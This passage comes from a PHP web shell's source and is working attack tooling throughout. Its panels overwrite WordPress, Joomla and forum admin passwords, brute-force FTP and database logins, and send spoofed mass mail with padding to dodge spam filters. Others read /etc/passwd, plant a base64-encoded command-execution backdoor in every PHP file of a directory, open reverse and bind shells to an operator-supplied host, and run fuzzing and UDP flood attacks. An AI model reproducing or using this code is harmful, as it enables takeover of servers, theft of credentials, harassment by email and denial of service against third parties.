					Table Prefix : <input type="text" name="prefix" class="sbox"> (Optional)</td>
				</p>
				</tr>
				<tr>
					<td height="70" width="780"><p align="center"><b>User ID :</b> <input class="sbox" type="text" name="uid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><input type = "submit" class="but" value = "Change It" name="forumpass"></td>
				</tr>
			</table>
			</form>		
			
			<a name="wordp" id="wordp">
			<font class="tblheads" size="4">Wordpress Password Changer</font>
			<form action="<?php echo $self; ?>" method = "POST" name="wp">
			<input type="hidden"  name="forums" value="wp">
			<a name="wordp" id="wordp">
			<table border = "1" width="50%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="100" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
				<p>
					Table Prefix : <input type="text" name="prefix" value="wp_" class="sbox"> (Optional)</td>
				</p>
				</tr>
				<tr>
					<td height="70" width="780"><p align="center"><b>User ID :</b> <input class="sbox" type="text" name="uid" size="20" value="1"></p><p><b>New Username :</b> <input class="sbox" type="text" name="uname" size="20" value="admin">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><input type = "submit" class="but" value = "Change It" name="forumpass"></td>
				</tr>
			</table>
			</form>
			
			<div name="jooml" id="jooml">
			<font class="tblheads" size="4">Joomla Password Changer</font>
			<form action="<?php echo $self; ?>" method = "POST">
			<input type="hidden"  name="forums" value="joomla">
			<table border = "1" width="50%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="100" width="780"> <p align="center"><b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost">&nbsp;<b>  DataBase&nbsp;:</b> <input type ="text" class="sbox" name = "f2" size="20"></p> <p align="center">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> <b>&nbsp;Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20">
				<p>
					Table Prefix : <input type="text" name="prefix" value="jos_" class="sbox"> (Optional)</td>
				</p>
				</tr>
				<tr>
					<td height="70" width="780"><p align="center"><b>New Username :</b> <input class="sbox" type="text" name="uname" size="20" value="admin">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><input type = "submit" class="but" value = "Change It" name="forumpass"></td>
				</tr>
			</table>
			</form>
			<?php
			if(isset($_GET['changed']))
			{	?><font size="3"><blink>Password Changed Successfully</blink></font><br><br><?php }
			else if(isset($_GET['cannotchange']))
			{	?><font class=txt size="3"><blink>Cannot Change Password</blink></font><br><br> <?php } ?>
		</center>	
			<?php
		}
	}

	
	// Mail

	else if(isset($_GET['tools']))
	{ 
		
		?>
		<center>
		<table cellpadding="5" border="2" style="width:50%;">
			<tr>
				<td colspan="2" align="center"><b>Port Scanner<br></b></td>
	   		</tr>
			<tr>
				<td align="center">
				<form name='scanner' method='post'>
	   			<input class="sbox" type='text' name='host' value='<?php echo $_SERVER["SERVER_ADDR"]; ?>' >
				</td>
	   			<td align="center">
				<select class="sbox" name='protocol'>
	   				<option value='tcp'>tcp</option>
	   				<option value='udp'>udp</option>
	   			</select>
				</td>
	   		<tr>
				<td colspan="2" align="center"><input class="but" type='submit' value='Scan Ports'></td>
			</tr>
			</form>
			
		<?php
		if(isset($_POST['host']) && isset($_POST['protocol']))
		{
			echo "<tr><td colspan=2><font size='3' face='Verdana'>Open Ports: ";
			$host = $_POST['host'];
			$proto = $_POST['protocol'];
			$myports = array("21","22","23","25","59","80","113","135","445","1025","5000","5900","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
			for($current = 0; $current <= 23; $current++)
			{
				$currents = $myports[$current];
				$service = getservbyport($currents, $proto);
				// Try to connect to port
				$result = fsockopen($host, $currents, $errno, $errstr, 1);
				// Show results
				if($result)
				{
					echo "<font class=txt size=3>$currents, </font>";
				}
			}
		}
		echo "</td></tr></table>";
		?>
		<br>
		<form action="<?php echo $self; ?>" method="get">
		<input type="hidden" name="tools">
		<table cellpadding="5" border="2" style="width:50%;">
			<tr>
				<td colspan="2" align="center"><font size="4">BruteForce</font></td>
			</tr>
			<tr>
				<td>Type : </td>
				<td>
					<select name="prototype" class="sbox">
						<option value="ftp">FTP</option>
						<option value="mysql">MYSQL</option>
						<option value="postgresql">PostgreSql</option>
					</select>
				</td>
			</tr>
			<tr>
				<td>Server <b>:</b> Port : </td>
				<td><input type="text" name="serverport" value="<?php echo $_SERVER["SERVER_ADDR"]; ?>" class="sbox"></td>
			</tr>
			<tr>
				<td valign="middle">Brute type : </td>
				<td><label><input type=radio name=type value="1" checked> /etc/passwd</label><label><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label><hr>
				<input type=radio name=type value="2"> Dictionary</label><br>
				Login : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="login" value="root" class="sbox"><br>
				Dictionary : <input type="text" name="dict" value="<?php echo getcwd() . $directorysperator; ?>passwd.txt" class="sbox">
				</td>
			</tr>
			<tr>
				<td colspan="2" align="center"><input type="submit" value="Attack >>" class="but"></td>
			</tr>
			</form>
			
		<?php
		if(isset($_GET['prototype'])) 
		{
			echo '<tr><td colspan=2><h1>Results</h1><div><span>Type:</span> '.htmlspecialchars($_GET['prototype']).' <span><br>Server:</span> '.htmlspecialchars($_GET['serverport']).'<br>';
			if( $_GET['prototype'] == 'ftp' ) 
			{
				function BruteFun($ip,$port,$login,$pass) 
				{
					$fp = @ftp_connect($ip, $port?$port:21);
					if(!$fp) return false;
					$res = @ftp_login($fp, $login, $pass);
					@ftp_close($fp);
					return $res;
				}
			}
			elseif( $_GET['prototype'] == 'mysql' )
			{
				function BruteFun($ip,$port,$login,$pass) 
				{
					$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);
					@mysql_close($res);
					return $res;
				}
			}
			elseif( $_GET['prototype'] == 'pgsql' )
			{
				function BruteFun($ip,$port,$login,$pass)
				{
					$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
					$res = @pg_connect($str);
					@pg_close($res);
					return $res;
				}
			}
			
			$success = 0;
			$attempts = 0;
			$server = explode(":", $_GET['server']);
			if($_GET['type'] == 1) 
			{
				$temp = @file('/etc/passwd');
				if( is_array($temp))
					foreach($temp as $line) 
					{
						$line = explode(":", $line);
						++$attempts;
						if(BruteFun(@$server[0],@$server[1], $line[0], $line[0]) ) 
						{
							$success++;
							echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
						}
						if(@$_GET['reverse']) 
						{
							$tmp = "";
							for($i=strlen($line[0])-1; $i>=0; --$i)
								$tmp .= $line[0][$i];
							++$attempts;
							if(BruteFun(@$server[0],@$server[1], $line[0], $tmp) ) 
							{
								$success++;
								echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
							}
						}
					}
			}
			elseif($_GET['type'] == 2) 
			{
				$temp = @file($_GET['dict']);
				if( is_array($temp) )
					foreach($temp as $line) 
					{
						$line = trim($line);
						++$attempts;
						if(BruteFun($server[0],@$server[1], $_GET['login'], $line) ) 
						{
							$success++;
							echo '<b>'.htmlspecialchars($_GET['login']).'</b>:'.htmlspecialchars($line).'<br>';
						}
					}
			}
			echo "<span>Attempts:</span> <font class=txt>$attempts</font> <span>Success:</span> <font class=txt>$success</font></div></td></tr>";
		}
		?>
		
		</table>
		</center><br>
		<?php
	}
	
	
// Mail

else if(isset($_GET['mailbomb']))
{ ?>
	<center><table><tr><td><a href="<?php echo $self; ?>?bomb&mailbomb"><font size="4">| Mail Bomber |</font></a></td><td><a href="<?php echo $self; ?>?mail&mailbomb"><font size="4">| Mass Mailer |</font></a></td></tr></table></center><br>
<?php
	if(isset($_GET['bomb']))
	{
		if(
			isset($_GET['to']) &&
			isset($_GET['subject']) &&
			isset($_GET['message']) &&
			isset($_GET['times']) &&
			$_GET['to'] != '' &&
			$_GET['subject'] != '' &&
			$_GET['message'] != '' &&
			$_GET['times'] != ''
		)
		{
			$times = $_GET['times'];
			while($times--)
			{
				if(isset($_GET['padding']))
				{
					$fromPadd = rand(0,9999);
					$subjectPadd = " -- ID : ".rand(0,9999999);
					$messagePadd = "\n\n------------------------------\n".rand(0,99999999);
					
				}
				$from = "president$fromPadd@whitehouse.gov";
				if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,"From:".$from))
				{
					$error = 1;
					echo "<center><font size=3><blink><blink>Some Error Occured!</blink></font></center>";
					break;
				}
			}
			if($error != 1)
			{
				echo "<center><font class=txt size=3><blink>Mail(s) Sent!</blink></font></center>";
			}
		}
		else
		{
			?>
			<form method="GET">
				<input type="hidden" name="bomb" />
				<input type="hidden" name="mailbomb" />
				<table id="margins" style="width:100%;">
					<tr>
						<td style="width:30%;">
							To 
						</td>
						<td>
							<input class="box" name="to" value="victim@domain.com,victim2@domain.com" onFocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onBlur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
						</td>
					</tr>
					
					<tr>
						<td style="width:30%;">
							Subject
						</td>
						<td>
							<input type="text" class="box" name="subject" value="Dhanush Here!" onFocus="if(this.value == 'Dhanush Here!')this.value = '';" onBlur="if(this.value=='')this.value='Dhanush Here!';" />
						</td>
					</tr>
					 <tr>
						<td style="width:30%;">
							No. of Times  
						</td>
						<td>
							<input class="box" name="times" value="100" onFocus="if(this.value == '100')this.value = '';" onBlur="if(this.value=='')this.value='100';"/>
						</td>
					</tr>
		   
					<tr>
						<td style="width:30%;">
							
							Pad your message (Less spam detection)
							
						</td>
						<td>
						
							<input type="checkbox" name="padding"/>
							  
						</td>
					</tr>
					<tr>
						<td colspan="2">
							<textarea name="message" cols="110" rows="10" class="box">Hello !! This is Dhanush!!</textarea>
						</td>
					</tr>
					
					
					<tr>
						<td rowspan="2">
							<input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="but" value="    Bomb!  "/>
						</td>
					</tr>
				</table>            
			</form>   
			<?php
		}
	}
	//Mass Mailer

	else if(isset($_GET['mail']))
	{
	    if
		(isset($_GET['to']) &&  isset($_GET['from']) &&  isset($_GET['subject']) && isset($_GET['message']))
		{
   			if(mail($_GET['to'],$_GET['subject'],$_GET['message'],"From:".$_GET['from']))
        	{
        	    echo "<center><font class=txt size=3><blink>Mail Sent!</blink></font></center>";
        	}
        	else
        	{
        	    echo "<center><font size=3><blink>Some Error Occured!</blink></font></center>";
        	}
    	}
   		else
    	{
        ?>
		<div align="left">
        <form method="GET">
            <input type="hidden" name="mail" />
			<input type="hidden" name="mailbomb" />
            <table align="left" style="width:100%;">
                <tr>
                    <td style="width:10%;">From</td>
                    <td style="width:80%;" align="left"><input name="from" class="box" value="Hello@abcd.in" onFocus="if(this.value == 'president@whitehouse.gov')this.value = '';" onBlur="if(this.value=='')this.value='president@whitehouse.gov';"/></td>
                </tr>
                
                <tr>
                    <td style="width:20%;">To</td>
                    <td style="width:80%;"><input class="box" class="box" name="to" value="victim@domain.com,victim2@domain.com" onFocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onBlur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/></td>
                </tr>
                
                <tr>
                    <td style="width:20%;">Subject</td>
                    <td style="width:80%;"><input type="text" class="box" name="subject" value="Dhanush Here!!" onFocus="if(this.value == 'Dhanush Here!!')this.value = '';" onBlur="if(this.value=='')this.value='Dhanush Here!!';" /></td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="box">Hello !! This is Dhanush!!!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="but" value="   Send! "/>
                    </td>
                </tr>
            </table>            
        </form></div>   
        <?php
    }
}
}

// View Passwd file

else if(isset($_GET['passwd']))
{
	$test='';
    $tempp= tempnam($test, "cx");
	$get = "/etc/passwd";
    if(copy("compress.zlib://".$get, $tempp))
	{
		$fopenzo = fopen($tempp, "r");
		$freadz = fread($fopenzo, filesize($tempp));
		fclose($fopenzo);
		$source = htmlspecialchars($freadz);
		echo "<tr><td><center><font size='3' face='Verdana'>$get</font><br><textarea rows='20' cols='80' class=box name='source'>$source</textarea>";
		unlink($tempp);
    } 
	else 
	{
   		if (isset ($_GET['val1'], $_GET['val2']) && is_numeric($_GET['val1']) && is_numeric($_GET['val2'])) 
		{
			$temp = "";
			for(;$_GET['val1'] <= $_GET['val2'];$_GET['val1']++) 
			{
				$uid = @posix_getpwuid($_GET['val1']);
				if ($uid)
					 $temp .= join(':',$uid)."\n";
			 }
			 echo '<br/>';
			 paramexe('Users', $temp);
	   }
	   else
	   {
			?>
			<form>
				<input type="hidden" name="passwd">
				<table border="1" cellpadding="5" cellspacing="5" align="center" style="width:40%;">
				<tr>
					<td>From : </td><td><input type="text" name="val1" class="sbox" value="1"></td>
				</tr>
				<tr>
					<td>To : </td><td><input type="text" name="val2" class="sbox" value="1000"></td>
				</tr>
				<tr>
					<td colspan="2" align="center"><input type="submit" value="  Go  " class="but"></td>
				</tr>
				</table><br>
			</form>
			<?php 
	   }
	}
}


// Code Injector

else if(isset($_GET['injector']))
{
    ?>
        <table id="margins" >
        <tr>
            <form method='POST'>
            <input type="hidden" name="injector"/>  
                <tr>
                    <td width="100" class="title">
                        Directory
                    </td>
                    <td>
                         <input class="box" name="pathtomass" value="<?php echo getcwd().$SEPARATOR; ?>" />
                    </td>
                </tr>
                <tr>
                <td class="title">
                    Mode
                </td>
                <td>
                        <select style="width: 400px;" name="mode" class="box">
                            <option value="Apender">Apender</option>
                            <option value="Overwriter">Overwriter</option>
                        </select>
                </td>
                </tr>
                <tr>
                    <td class="title">
                        File Type
                    </td>
                    <td>
                        <input type="text" class="box" name="filetype" value="php" onBlur="if(this.value=='')this.value='php';" />
                    </td>
                </tr>
                <tr>
					<td>Create A backdoor by injecting this code in every php file of current directory</td>
				</tr>
                
                <tr>
                    <td colspan="2">
                        <textarea name="injectthis" cols="110" rows="10" class="box"><?php echo base64_decode("PD9waHAgJGNtZCA9IDw8PEVPRA0KY21kDQpFT0Q7DQoNCmlmKGlzc2V0KCRfUkVRVUVTVFskY21kXSkpIHsNCnN5c3RlbSgkX1JFUVVFU1RbJGNtZF0pOyB9ID8+"); ?></textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="but" value="Inject "/>
                    </td>
                </tr>
        </form>
        </table>
        <?php
}
// Connect

else if(isset($_GET['connect']))
{
	    ?>       
    <table style="width:50%" align="center" >
    <tr>
        <th colspan="1" width="50px">Reverse Shell</th>
        <th colspan="1" width="50px">Bind Shell</th>
    </tr>
    <tr>
        <form action='<?php echo $self; ?>?connect' method='post' >  
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>IP </td>
                    <td>
                        <input type="text" class="box" style="width: 200px;" name="ip" value="<?php yourip();?>" />
                    </td>
                </tr>
                <tr>
                    <td>Port </td>
                    <td><input style="width: 200px;" class="box" name="port" size='5' value="21"/></td>

				</tr>
				<tr>
					<td style="vertical-align:top;">Use:</td>	
					<td><select style="width: 95px;" name="lang" class="sbox">
						<option value="perl">Perl</option>
						<option value="python">Python</option>
						<option value="php">PHP</option>
						</select>&nbsp;&nbsp;
					<input style="width: 90px;" class="but" type="submit" value="Connect!"/></td>
					
               </tr>
            </table>
         </td>
      </form> 
         <form action='<?php echo $self; ?>?connect' method='post' >
         <td style="vertical-align:top;">
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" class="box" name="port" value="21" />
                    </td>
                </tr>
                <tr>
                    <td>Password </td>
                    <td>
						<input style="width: 200px;" class="box" name="passwd" value="Dhanush"/>
					</td>
					<tr>
						<td>Using</td>
						<td>
						<select style="width: 95px;" name="lang" id="lang" class="sbox">
						<option value="perl">Perl</option>
						<option value="c">C</option>
						</select>&nbsp;&nbsp;
						<input style="width: 90px;" class="but" type="submit" value=" Bind "/></td>
                </tr>
            </table>
         </td>
         </form>
    </tr>
    </table>
	<div align="center">Click "Connect" only after open port for it. You should use NetCatï¿½, run "nc -l -n -v -p 21"!</div>
    <p align="center">Note : After clicking Submit button , The browser will start loading continuously , Dont close this window , Unless you are done!</p>
<?php
    if(isset($_POST['ip']) &&   isset($_POST['port']) &&  $_POST['ip'] != "" && $_POST['port'] != ""  )
    {
              
		$host = $_POST['ip'];
		$port = $_POST['port'];
		if($_POST["lang"] == "perl")
		{
			if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/bc.pl",'w');
				@fwrite($fh,gzuncompress(base64_decode($backconnect_perl)));
				@fclose($fh);
				echo "<font class=txt size=3>Trying to connect...</font></br>";
				execmd("perl ".getcwd()."/bc.pl $host $port &",$disable);
				if(!@unlink(getcwd()."/bc.pl")) echo "<font size=3>Warning: Failed to delete reverse-connection program</font></br>";
			} 
			else 
			{
				@$fh=fopen("/tmp/bc.pl","w");
				@fwrite($fh,gzuncompress(base64_decode($backconnect_perl)));
				@fclose($fh);
				echo "<font class=txt size=3>Trying to connect...</font></br>";
				execmd("perl /tmp/bc.pl $host $port &",$disable);
				if(!@unlink("/tmp/bc.pl")) echo "<font><h2>Warning: Failed to delete reverse-connection program<</h2>/font></br>";
			}
		}
		else if($_POST["lang"] == "python")
		{
			if(is_writable("."))
			{
				 $w_file=@fopen(getcwd()."/bc.py","w");
				 if($w_file)
				 {
					 @fputs($w_file,gzuncompress(base64_decode($back_connect_p)));
					 @fclose($w_file);
				 }
				 chmod('bc.py', 0777);
				 $blah = execmd("python ".getcwd()."/bc.py $host $port &");
				 echo "<font class=txt size=2>Trying to connect...</font></br>";
				 if(!@unlink("bc.py")) echo "<font><h2>Warning: Failed to delete reverse-connection program<</h2>/font></br>";				 
			} 
			else 
			{
			         $w_file=@fopen("/tmp/bc.py","w") or err();
				 if($w_file)
				 {
					 @fputs($w_file,gzuncompress(base64_decode($back_connect_p)));
					 @fclose($w_file);
				 }
				 chmod('/tmp/bc.py', 0777);
				 $blah = execmd("python /tmp/bc.py 127.0.0.1 21 &");
				 echo "<font class=txt size=2>Trying to connect...</font></br>";
				 if(!@unlink("/tmp/bc.py")) echo "<font><h2>Warning: Failed to delete reverse-connection program<</h2>/font></br>";
			}
		}
		else if($_POST["lang"] == "php")
		{
			 echo "<font class=txt size=3>Attempting to connect...</font>";
			$ip = $_POST['ip']; 
			$port=$_POST['port']; 
			$sockfd=fsockopen($ip , $port , $errno, $errstr ); 
			if($errno != 0)
			{
				echo "<font class=txt><b>$errno</b> : $errstr</font>";
			}
			else if (!$sockfd)
			{ 
				   $result = "<p>Fatal : An unexpected error was occured when trying to connect!</p>";
			} 
			else
			{ 
				fputs ($sockfd ,"\n=================================================================\nCoded By Arjun\n=================================================================");
			 $pwd = exec_all("pwd");
			 $sysinfo = exec_all("uname -a");
			 $id = exec_all("id");
			 $len = 1337;
			 fputs($sockfd ,$sysinfo . "\n" );
			 fputs($sockfd ,$pwd . "\n" );
			 fputs($sockfd ,$id ."\n\n" );
			 fputs($sockfd ,$dateAndTime."\n\n" );
			 while(!feof($sockfd))
			 {  
				$cmdPrompt ="(dhanush)[$]> ";
				fputs ($sockfd , $cmdPrompt ); 
				$command= fgets($sockfd, $len);
				fputs($sockfd , "\n" . exec_all($command) . "\n\n");
			} 
			fclose($sockfd); 
			} 
		}
	}
	else if(isset($_POST['passwd']) && isset($_POST['port']) && isset($_POST['lang']))
	{
		 $passwd = $_POST['passwd'];
		 if($_POST['lang'] == 'c') 
		 {
			if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/bp.c",'w');
				@fwrite($fh,gzinflate(base64_decode($bind_port_c)));
				@fclose($fh);
				execmd("chmod ".getcwd()."/bp.c 0755");
				execmd("gcc -o ".getcwd()."/bp ".getcwd()."/bp.c");
				execmd("chmod ".getcwd()."/bp 0755");
				$out = execmd(getcwd()."/bp"." ".$_POST['port']." ". $passwd ." &");
				echo "<pre>$out\n".execmd("ps aux | grep bp.pl")."</pre>"; 
			} 
			else 
			{
				@$fh=fopen("/tmp/bp.c","w");
				@fwrite($fh,gzinflate(base64_decode($bind_port_c)));
				@fclose($fh);
				execmd("chmod /tmp/bp.c 0755");
				execmd("gcc -o /tmp/bp /tmp/bp.c");
				$out = execmd("/tmp/bp"." ".$_POST['port']." ". $passwd ." &");
				echo "<pre>$out\n".execmd("ps aux | grep bp")."</pre>"; 
			}
        } 
		if($_POST['lang'] == 'perl') 
		{ 
            if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/bp.pl",'w');
				@fwrite($fh,gzinflate(base64_decode($bind_port_p)));
				@fclose($fh);
				execmd("chmod ".getcwd()."/bp.pl 0755");
				$out = execmd("perl ".getcwd()."/bp.pl" . " " . $passwd ." &");
				echo "<pre>$out\n".execmd("ps aux | grep bp.pl")."</pre>"; 
			} 
			else 
			{
				@$fh=fopen("/tmp/bp.pl","w");
				@fwrite($fh,gzinflate(base64_decode($bind_port_p)));
				@fclose($fh);
				$out = execmd("perl /tmp/bp.pl ". $passwd ." &"); 
				echo "<pre>$out\n".execmd("ps aux | grep bp.pl")."</pre>"; 
			}
        }
    }
}

//fuzzer

else if(isset($_GET['fuzz']))
{
    if(isset($_GET['ip']) &&
    isset($_GET['port']) &&
    isset($_GET['times']) &&
    isset($_GET['time']) &&
    isset($_GET['message']) &&
    isset($_GET['messageMultiplier']) &&
    $_GET['message'] != "" &&
    $_GET['time'] != "" &&
    $_GET['times'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['messageMultiplier'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $times = $_GET['times'];
	   $timeout = $_GET['time'];
	   $send = 0;
       $ending = "";
       $multiplier = $_GET['messageMultiplier'];
       $data = "";
       $mode="tcp";
       $data .= "GET /";
       $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if($_GET['type'] == "tcp")
        {
            $mode = "tcp";
        }
        while($multiplier--)
        {
            $data .= urlencode($_GET['message']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
        $data .= "by-Dhanush".$ending;
        $length = strlen($data);
        
        
       echo "Sending Data :- <br /> <p align='center'>$data</p>";
        
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   for($i=0;$i<$times;$i++)
	   {
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data , $length );
                fclose($socket);
            }
        }
        echo "<script>alert('Fuzzing Completed!');</script>";
        echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $times . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($times*$length) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($length) . "<br />";
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="fuzz" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="box" name="ip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="box" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout
                    </td>
                    <td>
                        <input type="text" class="box" name="time" value="5" onFocus="if(this.value == '5')this.value = '';" onBlur="if(this.value=='')this.value='5';"/>
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        No of times
                    </td>
                    <td>
                        <input type="text" class="box" name="times" value="100" onFocus="if(this.value == '100')this.value = '';" onBlur="if(this.value=='')this.value='100';" />
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Message (The message Should be long and it will be multiplied with the value after it)
                    </td>
                    <td>
                        <input class="box" name="message" value="%S%x--Some Garbage here --%x%S" onFocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = '';" onBlur="if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
                    <td width="20">
                        <input style="width: 30px;" class="box" name="messageMultiplier" value="10" />
                    </td>
                </tr>
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="but" value="  Submit  "/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}


	//DDos
	
	else if(isset($_GET['dos']))
	{ 
		if(isset($_GET['ip']) &&  isset($_GET['exTime']) && isset($_GET['port']) && isset($_GET['timeout']) && isset($_GET['exTime']) && $_GET['exTime'] != "" &&
		$_GET['port'] != "" && $_GET['ip'] != "" &&	$_GET['timeout'] != "" && $_GET['exTime'] != ""	)
		{
		   $IP=$_GET['ip'];
		   $port=$_GET['port'];
		   $executionTime = $_GET['exTime'];
		   $noOfBytes = $_GET['noOfBytes'];
		   $data = "";
		   $timeout = $_GET['timeout'];
		   $packets = 0;
		   $counter = $noOfBytes;
		   $maxTime = time() + $executionTime;;
		   while($counter--)
		   {
				$data .= "X";
		   }
		   $data .= " Dhanush"; 
		   print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
		   
		   while(1)
		   {
				$socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
				if($socket)
				{
					fwrite($socket , $data);
					fclose($socket);
					$packets++;
				}
				if(time() >= $maxTime)
				{
					break;
				}
			}
			echo "<script>alert('Dos Completed!');</script>";
			echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />";
			echo "Total Number of Packets Sent : " . $packets . "<br />";
			echo "Total Data Sent = ". HumanReadableFilesize($packets*$noOfBytes) . "<br />"; 
			echo "Data per packet = " . HumanReadableFilesize($noOfBytes) . "<br />";
		}
		else
		{
			?>
			<form method="GET">
				<input type="hidden" name="dos" />
				<table id="margins">
					<tr>
						<td width="400" class="title">
							IP
						</td>
						<td>
							<input class="box" name="ip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/>
						</td>
					</tr>
					
					<tr>
						<td class="title">
							Port
						</td>
						<td>
							<input class="box" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/>
						</td>
					</tr>
					
					<tr>
						<td class="title">
							Timeout (Time in seconds)
						</td>
						<td>
							<input type="text" class="box" name="timeout" value="5" onFocus="if(this.value == '5')this.value = '';" onBlur="if(this.value=='')this.value='5';" />
						</td>
					</tr>
					
					
					<tr>
						<td class="title">
							Execution Time (Time in seconds)
						</td>
						<td>
							<input type="text" class="box" name="exTime" value="10" onFocus="if(this.value == '10')this.value = '';" onBlur="if(this.value=='')this.value='10';"/>
						</td>
					</tr>
					
					<tr>
						<td class="title">
							No of Bytes per/packet
						</td>
						<td>
							<input type="text" class="box" name="noOfBytes" value="999999" onFocus="if(this.value == '999999')this.value = '';" onBlur="if(this.value=='')this.value='999999';"/>
						</td>
					</tr>
					
	
					<tr>
						<td rowspan="2">
							<input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="but" value="   Attack >> "/>
						</td>
					</tr>
				</table>            
			</form>
			<?php
		}
	}

// Sec info
else if(isset($_GET['secinfo']))
{ ?>
<br><br><center><font size=5>Server security information</font><br><br></center>
	<table style="width:100%;" border="1" class="pwdtbl">
	<tr>
		<td style="width:7%;">Curl</td>
		<td style="width:7%;">Oracle</td>
		<td style="width:7%;">MySQL</td>
		<td style="width:7%;">MSSQL</td>
		<td style="width:7%;">PostgreSQL</td>
		<td style="width:12%;">Open Base Directory</td>
		<td style="width:10%;">Safe_Exec_Dir</td>
		<td style="width:7%;">PHP Version</td>
		<td style="width:7%;">Server Admin</td> 
	</tr>
	<tr>
		<td style="width:7%;"><font class="txt"><?php curlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php oracleinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php mysqlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php mssqlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php postgresqlinfo(); ?></font></td>
		<td style="width:12%;"><font class="txt"><?php echo $basedir; ?></font></td>
		<td style="width:10%;"><font class="txt"><?php if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_exec_dir'))) {echo "NONE</b>";}else {echo "<font class=txt>$df</font></b>";};} ?></font></td>
		<td style="width:7%;"><font class="txt"><?php phpver(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php serveradmin(); ?></font></td>
	</tr>
</table><br> <?php
	mysecinfo();
}

else if(isset($_GET["com"]))
{
	echo "<br>";
	ob_start();
	eval("phpinfo();");
	$b = ob_get_contents();
	ob_end_clean();
	$a = strpos($b,"<body>")+6;
	$z = strpos($b,"</body>");
	$s_result = "<div class='myphp'>".substr($b,$a,$z-$a)."</div>";
	echo $s_result;
}

else if(isset($_GET['perms']))
{
?>
    <form method="POST" action="<?php echo $self; ?>" >
